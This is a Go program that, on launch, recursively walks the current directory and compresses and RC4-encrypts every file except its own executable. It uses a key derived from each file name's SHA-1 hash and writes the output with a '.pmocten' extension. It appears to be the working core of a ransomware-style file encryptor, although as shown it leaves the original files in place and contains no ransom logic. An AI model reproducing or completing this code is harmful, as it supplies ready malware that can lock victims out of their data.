package main

import (
	"bytes"
	"compress/zlib"
	"crypto/sha1"
	"os"
	"path/filepath"
)

func listFilesRecursively(dir string) []string {
	var files []string

	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() {
			files = append(files, path)
		}

		return nil
	})

	if err != nil {
		return files
	}

	return files
}

func readFile(filename string) []byte {
	file, err := os.Open(filename)

	if err != nil {
		return nil
	}

	defer file.Close()

	stat, err := file.Stat()

	if err != nil {
		return nil
	}

	bytestream := make([]byte, stat.Size())
	_, err = file.Read(bytestream)
	if err != nil {
		return nil
	}

	return bytestream
}

func hash(data string) []byte {
	hasher := sha1.New()
	hasher.Write([]byte(data))
	return hasher.Sum(nil)
}

func writeFile(filename string, data []byte) bool {
	file, err := os.Create(filename)

	if err != nil {
		return false
	}

	defer file.Close()

	_, err = file.Write(data)

	return err == nil
}

func compressBytes(data []byte) ([]byte, error) {
	var buffer bytes.Buffer
	writer := zlib.NewWriter(&buffer)

	if _, err := writer.Write(data); err != nil {
		return nil, err
	}

	if err := writer.Close(); err != nil {
		return nil, err
	}

	return buffer.Bytes(), nil
}

func rc4(data []byte, key []byte) []byte {
	state := make([]int, 256)

	for i := 0; i < 256; i++ {
		state[i] = i
	}

	j := 0

	for i := 0; i < 256; i++ {
		j = (j + state[i] + int(key[i%len(key)])) % 256
		state[i], state[j] = state[j], state[i]
	}

	encrypted := make([]byte, len(data))
	i := 0
	j = 0

	for k, v := range data {
		i = (i + 1) % 256
		j = (j + state[i]) % 256
		state[i], state[j] = state[j], state[i]
		encrypted[k] = v ^ byte(state[(state[i]+state[j])%256])
	}

	return encrypted
}

func encrypt(filename string) {
	if filename == os.Args[0] {
		return
	}

	data := readFile(filename)

	if data == nil {
		return
	}

	compressed, err := compressBytes(data)

	if err != nil {
		return
	}

	key := hash(filename)
	encrypted := rc4(compressed, key)
	encryptedFilename := filename + ".pmocten"
	writeFile(encryptedFilename, encrypted)

}

func main() {
	files := listFilesRecursively(".")

	for _, file := range files {
		encrypt(file)
	}
}
